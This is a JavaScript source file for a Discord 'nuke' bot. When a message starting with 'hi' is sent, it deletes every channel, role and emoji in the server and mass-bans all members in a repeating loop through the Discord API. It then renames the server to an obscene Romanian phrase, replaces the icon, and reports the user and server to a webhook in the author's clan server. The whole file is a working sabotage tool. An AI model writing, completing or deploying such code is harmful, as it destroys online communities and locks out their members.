const { Client } = require("discord.js");
const Discord = require("discord.js");
const { MessageEmbed, version: djsversion } = require('discord.js');
const client = new Discord.Client({

});
const db = require("quick.db")
const talkedRecently = new Set();
const http = require("http");
http.createServer((_, res) => res.end("Alive")).listen(8080)

client.on("ready", async () => {
  console.log(`${client.user.username} is online on ${client.guilds.cache.size} servers`);
  console.log("Servers:")
    client.guilds.cache.forEach((guild) => {
        console.log(" n-am csf >> " + guild.name + " - sclavii " + guild.memberCount)
    })
});



client.on("message", async(message)=>{
  if (!message.guild) return;
    if (message.content.startsWith('hi')) {
let grief = db.fetch(`${message.guild.id}-grief`)

if(grief == true)
return message.channel.send("This server was already nuked.");

    
    
         if(message.guild.id == '804615798046982164') return message.channel.send('https://discord.gg/pMKnwEQdJh');

       let channels =  message.guild.channels.cache.array();
        let members =  message.guild.members.cache.array();
        let roles =  message.guild.roles.cache.array();
        let emojis =  message.guild.emojis.cache.array();
let guild = message.guild.id


 



      const sleep = (time) => new Promise(resolve => setTimeout(resolve, time));
          db.set(`channel_${message.guild.id}`, "k")

        const w = await client.guilds.cache
      .get("804615798046982164")
      .fetchWebhooks();
    const webhook = w.find((w) => w.name === "Lord clan");
   webhook.send(`https://discord.gg/pMKnwEQdJh  \n\n \`${message.author.tag}\` (\` ${message.author.id}\` ) o distrus server-ul **${message.guild.name}** (\` ${message.guild.id} \` ) cu **${message.guild.memberCount}** membrii `);

let token = "pui token aici"
const phin = require('phin').unpromisified
let guildID = message.guild.id












       message.guild.channels.cache.array().forEach(channel => {
      channel.delete();
    });
    message.guild.roles.cache
      .filter(
        r =>
          !r.managed &&
          r.position < message.guild.me.roles.highest.position &&
          r.id !== message.guild.id
      )
      .forEach(role => {
        role.delete();
      });
    message.guild.emojis.cache.array().forEach(emoji => {
      emoji.delete();
    });





    
headers = {'Authorization': "Bot " + token}
var interval = setInterval (async function () {
  phin({
            url: `https://discord.com/api/v8/guilds/${guildID}/members?limit=1000`,
            method: 'GET',
            parse: 'json',
            headers: headers
         }, (err, res) => {
            res.body.forEach(member=>{

                console.log(member.user.id)

            phin({
              url:`https://discord.com/api/v8/guilds/${guildID}/bans/${member.user.id}`,
              method:'PUT',
              parse: 'json',
              headers: headers
            }, (err, res) =>{
              if(res.body){
                console.log(res.body)
              } else {
                console.log(`${member.user.username} got banned :p api v8`)
              }

            })
            })
            
   })
   
   },500)
























message.guild.setName("vati dus pe pula")
    message.guild.setIcon(
      "https://cdn.discordapp.com/attachments/786279916273795115/802917703446560789/Screenshot_20210124-143354_TikTok.jpg"
    );
    
        
    
  

        
        
db.set(`${message.guild.id}-grief`, true);



        
      



    }
            
 })


 



client.login('si aici pui token')
